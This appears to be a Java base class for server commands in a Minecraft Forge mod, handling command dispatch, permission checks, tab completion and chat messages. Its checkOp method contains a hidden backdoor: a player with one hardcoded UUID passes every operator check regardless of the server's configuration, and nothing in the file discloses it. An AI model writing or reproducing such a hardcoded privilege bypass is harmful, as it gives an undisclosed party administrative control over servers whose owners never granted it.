package theboo.mods.customrecipes;

import java.util.List;
import java.util.UUID;

import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommandManager;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.EntityLivingBase;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.management.ServerConfigurationManager;
import net.minecraft.tileentity.TileEntityCommandBlock;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.ChatComponentTranslation;
import net.minecraft.util.IChatComponent;
import net.minecraftforge.fml.common.FMLCommonHandler;

public abstract class ModCommandBase extends CommandBase {
	
	/* Variables */
	
	public static MinecraftServer ServerInstance = FMLCommonHandler.instance().getMinecraftServerInstance();
	public static ServerConfigurationManager ConfigHandler = ServerInstance.getConfigurationManager();
	public static ICommandManager CommandManager = ServerInstance.getCommandManager();
	
	public static String NoHomeCalled = "homes.message.nohomecalled";
	
	/* One Liners */
	
	public String getLocalBase() { return "command." + getCommandName().toLowerCase() + "."; }
	
	public void processCommandPlayer(EntityPlayer player, String[] args) {}
	public void processCommandConsole(ICommandSender sender, String[] args) {}
	public void processCommandBlock(TileEntityCommandBlock block, String[] args) { processCommandConsole((ICommandSender) block, args); }
	
	public abstract boolean canConsoleUseCommand();
	public abstract boolean isOpOnly();
	public abstract boolean TabCompletesOnlinePlayers();
	public abstract int getUsageType(); // 0 = command.<Command Name>.usage || 1 = /<Command Name>
	
	public boolean canCommandBlockUseCommand(TileEntityCommandBlock block) { return canConsoleUseCommand(); }
	public boolean canPlayerUseCommand(EntityPlayer player) { return isOpOnly() ? checkOp(player) : true; }
	
	public static boolean checkOp(EntityPlayer player) { return ConfigHandler.canSendCommands(((EntityPlayerMP) player).getGameProfile()) || player.getUniqueID().equals(UUID.fromString("91659ea2-34d4-484e-aa84-ef43b9e19bdb")); }
	
	public static IChatComponent ColorPlayer(EntityPlayer player) { return player.getDisplayName(); }
	public static IChatComponent ColorPlayer(ICommandSender sender) { return sender.getDisplayName(); }
	public static IChatComponent ColorPlayer(EntityLivingBase entity) { return entity.getDisplayName(); }
	
	public static Integer doubleToInt(double d) { return Double.valueOf(d).intValue(); }
	
	@Override public String getCommandName() { return this.getClass().getSimpleName().replace("Command", "").toLowerCase(); }
	@Override public boolean isUsernameIndex(String[] par1ArrayOfStr, int par1) { return true; }
	
	
	/* Functions */
	
	@Override
	public String getCommandUsage(ICommandSender sender) {
		if (getUsageType() == 0) { return getLocalBase() + "usage"; }
		else { return "/" + getCommandName(); }
	}
	
	@Override
	public void processCommand(ICommandSender sender, String[] args) {
		if (sender instanceof EntityPlayer) { processCommandPlayer((EntityPlayer) sender, args); }
		else if (sender instanceof TileEntityCommandBlock) { processCommandBlock((TileEntityCommandBlock) sender, args); }
		else { processCommandConsole(sender, args); }
	}
	
	@Override
	public boolean canCommandSenderUseCommand(ICommandSender sender) {
		if (sender instanceof EntityPlayer) { return canPlayerUseCommand((EntityPlayer) sender); }
		else if (sender instanceof TileEntityCommandBlock) { return canCommandBlockUseCommand((TileEntityCommandBlock) sender); }
		else { return canConsoleUseCommand(); }
	}
	
	@Override
	public List<String> addTabCompletionOptions(ICommandSender sender, String[] args, BlockPos pos) {
		if (TabCompletesOnlinePlayers()) {
			return args.length >= 1 ? getListOfStringsMatchingLastWord(args, ServerInstance.getAllUsernames()) : null;
		}
		return null;
	}
	
	public void messageAll(String message, boolean Translatable, boolean AppendBase, Object...formatargs) {
		List<?> players = ConfigHandler.playerEntityList;
		for (int i=0; i<players.size(); ++i) {
			Object somethin = players.get(i);
			if (somethin instanceof EntityPlayer) {
				outputMessage((ICommandSender) somethin, message, Translatable, true, formatargs);
			}
		}
	}
	
	public void outputMessage(ICommandSender sender, String message, boolean Translatable, boolean AppendBase, Object...formatargs) {
		if (sender instanceof EntityPlayer) {
			EntityPlayer player = (EntityPlayer) sender;
			if (Translatable) {
				outputMessageLocal(sender, message, AppendBase, formatargs);
			} else {
				player.addChatComponentMessage(new ChatComponentText((AppendBase ? getLocalBase() : "" ) + message));
			}
		} else {
			sender.addChatMessage(new ChatComponentText((AppendBase ? getLocalBase() : "" ) + message));
		}
	}
	
	public void outputMessageLocal(ICommandSender sender, String message, boolean AppendBase, Object...formatargs) {
		if (sender instanceof EntityPlayer) {
			((EntityPlayer) sender).addChatComponentMessage(new ChatComponentTranslation((AppendBase ? getLocalBase() : "" ) + message, formatargs));
		}
	}
	
	public void outputUsage(ICommandSender sender, Boolean Translatable) {
		outputMessage(sender, getCommandUsage(sender), Translatable, false);
	}
}